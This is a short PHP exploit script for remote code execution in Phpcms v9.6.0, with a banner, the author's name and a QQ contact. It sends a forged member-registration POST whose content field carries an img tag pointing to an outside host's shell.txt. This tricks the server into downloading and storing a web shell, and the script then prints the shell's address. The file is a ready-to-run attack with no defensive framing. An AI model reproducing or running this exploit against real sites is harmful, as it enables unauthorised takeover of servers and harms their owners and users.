<?php
print_r('
****************************************************
*
*    Phpcms v9.6.0 Remote Code Execution Exp
*    by SMLDHZ
*    QQ:3298302054
*    Usage: php '.basename(__FILE__).' url/path
*    php '.basename(__FILE__).' http://192.168.1.1/
*
****************************************************
');
if($argc!=2){
    exit;
}
$shellAddr  = 'http://mmp.im/shell.txt';

$target     = $argv[1];
$url        = $target.'/index.php?m=member&c=index&a=register&siteid=1';
$payload    = 'dosubmit=1&siteid=1&modelid=11&username=SMLDHZ'.time().
            '&password=nidaye&pwdconfirm=nidaye&email=SMLDHZ'.time().
            '%40dqdq.com&nickname=SMLDHZ'.time().
            '&info[content]=<img src='.$shellAddr.'?.php#.jpg>';
            
echo "[+]Witness the miracle...\n";
$return     =sendPayload($url,$payload);
if(preg_match('#img src=(.*?)\&gt#', $return, $match)){
    echo "[+]shell: " . $match[1];
}else{
    echo "[!]failed!\n".$return;
}

function sendPayload($url,$payload){
    $ch     = curl_init ();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    $return = curl_exec($ch);
    curl_close($ch);
    return $return;
}

